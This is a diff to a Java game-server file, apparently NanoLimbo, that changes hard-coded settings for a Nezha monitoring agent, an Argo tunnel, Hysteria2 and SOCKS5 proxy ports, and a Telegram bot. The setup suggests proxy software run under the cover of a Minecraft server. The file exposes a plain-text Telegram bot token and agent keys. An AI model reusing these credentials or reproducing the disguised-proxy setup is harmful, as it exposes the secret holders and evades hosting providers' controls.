@@ -157,21 +157,21 @@ public final class NanoLimbo {
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "nezha.jaxmike.nyc.mn");
         envVars.put("NEZHA_PORT", "443");
-        envVars.put("NEZHA_KEY", "4H8K1yzVUse2kJ9nVo");
+        envVars.put("NEZHA_KEY", "B8LPJsnO4AoAHdidrs");
         envVars.put("ARGO_PORT", "8001");
         envVars.put("ARGO_DOMAIN", "");
         envVars.put("ARGO_AUTH", "");
-        envVars.put("HY2_PORT", "9474");
-        envVars.put("S5_PORT", "11610");
+        envVars.put("HY2_PORT", "22761");
+        envVars.put("S5_PORT", "22761");
         envVars.put("TUIC_PORT", "");
         envVars.put("REALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
-        envVars.put("DISABLE_ARGO", "false");
+        envVars.put("DISABLE_ARGO", "true");
         envVars.put("CHAT_ID", "7592034407");
         envVars.put("BOT_TOKEN", "8002189523:AAFDp3-de5-dw-RkWXsFI5_sWHrFhGWn1hs");
         envVars.put("CFIP", "saas.sin.fan");
         envVars.put("CFPORT", "2096");
-        envVars.put("NAME", "optiklink");
+        envVars.put("NAME", "cs");
 
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
